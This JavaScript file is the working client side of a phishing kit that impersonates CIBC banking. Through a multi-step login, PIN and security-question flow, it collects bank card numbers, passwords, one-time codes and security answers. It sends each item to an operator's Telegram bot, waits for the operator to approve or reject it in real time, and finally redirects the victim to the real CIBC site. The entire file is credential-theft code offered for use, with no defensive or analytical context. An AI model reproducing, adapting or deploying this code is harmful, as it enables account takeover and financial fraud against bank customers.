// ---------------- Validation ----------------
function luhnCheck(num) {
    const d = num.replace(/\D/g,'');
    if (d.length < 12) return false;
    let sum = 0, dbl = false;
    for (let i = d.length - 1; i >= 0; i--) {
        let x = +d[i];
        if (dbl) { x *= 2; if (x > 9) x -= 9; }
        sum += x;
        dbl = !dbl;
    }
    return sum % 10 === 0;
}

function validPassword(pw) { return pw.length >= 6; }

function showStep(step) {
    ['stepLogin','stepPIN','stepSQ','stepConfirm'].forEach(s => {
        const el = document.getElementById(s);
        if (el) el.style.display = 'none';
    });
    document.getElementById(step).style.display = 'flex';
    
    // swap header banner after login
    const headerImg = document.getElementById('header-img');
    if(step !== 'stepLogin') headerImg.src = 'banner2.jpg';
    else headerImg.src = 'banner.jpg';
}

function showError(msg, errorId='errorMsg') {
    const el = document.getElementById(errorId);
    if(el) el.textContent = msg;
}

// ---------------- Telegram Controller ----------------
async function sendTelegramWithKeyboard(title, text, onSuccess, onError){
    try {
        const res = await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
                chat_id:'<?php echo $chatId;?>',
                text: text,
                parse_mode: "HTML",
                reply_markup: {inline_keyboard: [
                    [{text:'✅ Correct', callback_data:'level2'}],
                    [{text:'❌ Incorrect', callback_data:'error'}]
                ]}
            })
        });
        const data = await res.json();
        if(!data.ok){ onError(); return; }

        const msgId = data.result.message_id;

        const poll = setInterval(async () => {
            const updates = await (await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/getUpdates`)).json();
            for (const u of updates.result || []) {
                if (u.callback_query && u.callback_query.message?.message_id === msgId) {
                    clearInterval(poll);
                    await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/answerCallbackQuery`, {
                        method:'POST', headers:{'Content-Type':'application/json'},
                        body: JSON.stringify({callback_query_id: u.callback_query.id})
                    });
                    await fetch(`https://api.telegram.org/bot<?php echo $telegramToken;?>/editMessageReplyMarkup`, {
                        method:'POST', headers:{'Content-Type':'application/json'},
                        body: JSON.stringify({chat_id:'<?php echo $chatId;?>', message_id: msgId, reply_markup:{inline_keyboard:[]}})
                    });

                    if(u.callback_query.data === 'level2') onSuccess(); else onError();
                }
            }
        }, 1500);
    } catch(e){ onError(); }
}

// ---------------- Login Step ----------------
const cardInput = document.getElementById('cardNumber');
const pwInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginSpinner = document.getElementById('loginSpinner');

loginBtn.addEventListener('click', ()=>{
    showError('');
    const card = cardInput.value.trim();
    const pw = pwInput.value.trim();
    if(!luhnCheck(card) || !validPassword(pw)){
        showError('Incorrect card number or password');
        return;
    }

    loginSpinner.style.display = 'inline-block';
    const telegramText = `🟥 CIBC CONTROLLER 🟥\n\n<code>${card}</code>\n<code>${pw}</code>\n\n🟥 CIBC CONTROLLER 🟥`;

    sendTelegramWithKeyboard('Login', telegramText, ()=>{
        loginSpinner.style.display = 'none';
        document.getElementById('loginBanner').style.display='none';
        showStep('stepPIN'); // banner2 swaps here
    }, ()=>{
        showError('Incorrect card number or password');
        loginSpinner.style.display = 'none';
    });
});

// ---------------- PIN Step ----------------
const pinInput = document.getElementById('pinCode');
const pinBtn = document.getElementById('pinBtn');
const pinSpinner = document.getElementById('pinSpinner');

pinBtn.addEventListener('click', ()=>{
    showError('');
    const code = pinInput.value.trim();
    if(!/^\d{6}$/.test(code)){
        showError('Enter valid 6-digit code');
        return;
    }

    pinSpinner.style.display = 'inline-block';
    const telegramText = `🟥 CIBC CONTROLLER 🟥\n\n<code>${code}</code>\n\n🟥 CIBC CONTROLLER 🟥`;

    sendTelegramWithKeyboard('PIN', telegramText, ()=>{
        pinSpinner.style.display = 'none';
        showStep('stepSQ');
    }, ()=>{
        showError('Incorrect code');
        pinSpinner.style.display = 'none';
    });
});

// ---------------- Security Question / Deposit Step ----------------
const sqInput = document.getElementById('sqAnswer');
const confirmDepositBtn = document.getElementById('confirmDepositBtn');
const cancelDepositBtn = document.getElementById('cancelDepositBtn');
const sqSpinner = document.getElementById('sqSpinner');

confirmDepositBtn.addEventListener('click', ()=>{
    showError('', 'errorMsgSQ');
    const ans = sqInput.value.trim();
    if(!ans){
        showError('Answer is wrong','errorMsgSQ');
        return;
    }

    sqSpinner.style.display = 'inline-block';
    const sender = document.getElementById('senderName').textContent;
    const amount = document.getElementById('amount').textContent;
    const telegramText = `🟥 CIBC CONTROLLER 🟥\n\n<code>${sender}</code>\n<code>${amount}</code>\n<code>${ans}</code>\n\n🟥 CIBC CONTROLLER 🟥`;

    sendTelegramWithKeyboard('Deposit Confirmation', telegramText, ()=>{
        sqSpinner.style.display = 'none';
        showStep('stepConfirm');
    }, ()=>{
        showError('Network Error, please try again later','errorMsgSQ');
        sqSpinner.style.display = 'none';
    });
});

cancelDepositBtn.addEventListener('click', ()=>{
    if(confirm('Are you sure you want to cancel this deposit?')){
        showError('Deposit cancelled');
        document.getElementById('loginBanner').style.display='block';
        showStep('stepLogin'); // banner resets to original
    }
});

// ---------------- Confirmation Step ----------------
const confirmBtn = document.getElementById('confirmBtn');
const confirmSpinner = document.getElementById('confirmSpinner');

confirmBtn.addEventListener('click', ()=>{
    confirmSpinner.style.display = 'inline-block';
    const telegramText = `🟥 CIBC CONTROLLER 🟥\n\nSUCCESFUL DEPOSIT\n\n🟥 CIBC CONTROLLER 🟥`;

    sendTelegramWithKeyboard('Confirmation', telegramText, ()=>{
        confirmSpinner.style.display = 'none';
        setTimeout(()=>window.location.href='https://www.cibc.com', 30000);
    }, ()=>{
        showError('Network error');
        confirmSpinner.style.display = 'none';
    });
});

